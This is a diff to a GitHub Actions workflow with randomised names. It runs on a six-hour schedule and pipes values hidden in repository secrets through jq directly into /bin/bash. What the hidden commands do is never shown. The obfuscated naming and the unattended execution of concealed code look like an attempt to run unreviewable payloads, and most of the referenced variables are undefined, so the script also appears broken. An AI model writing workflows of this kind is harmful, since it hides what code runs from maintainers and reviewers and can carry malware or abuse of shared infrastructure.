@@ -1,27 +1,22 @@
 name: chengyiwaj
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 3/6 * * *'
+    - cron: '40 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chengyiwaj
         env:
-          lujpn0: ${{ secrets.lujpn0 }}
+          lh1: ${{ secrets.lh1 }}
         run: |
-          echo $lujpn0 | jq -r .hygh2 | /bin/bash
-          echo $zi43609 | jq -r .hf808 | /bin/bash
-          echo $mgesv0606 | jq -r .vpqyv7 | /bin/bash
-          echo $onvsc522 | jq -r .dz2 | /bin/bash
-          echo $ynzpm6 | jq -r .zm551 | /bin/bash
-          echo $li18061 | jq -r .m3 | /bin/bash
-          echo $bn74 | jq -r .evr47856 | /bin/bash
-          echo $iif44915 | jq -r .feq316 | /bin/bash
-          echo $dwg65 | jq -r .wfn44204 | /bin/bash
+          echo $lh1 | jq -r .qniee57906 | /bin/bash
+          echo $a500 | jq -r .gfzqq24 | /bin/bash
+          echo $u0 | jq -r .aqdw0 | /bin/bash
+          echo $dwhe626 | jq -r .go091 | /bin/bash
+          echo $xg00 | jq -r .qabx2 | /bin/bash
+          echo $vx82953 | jq -r .kgqx564 | /bin/bash
 
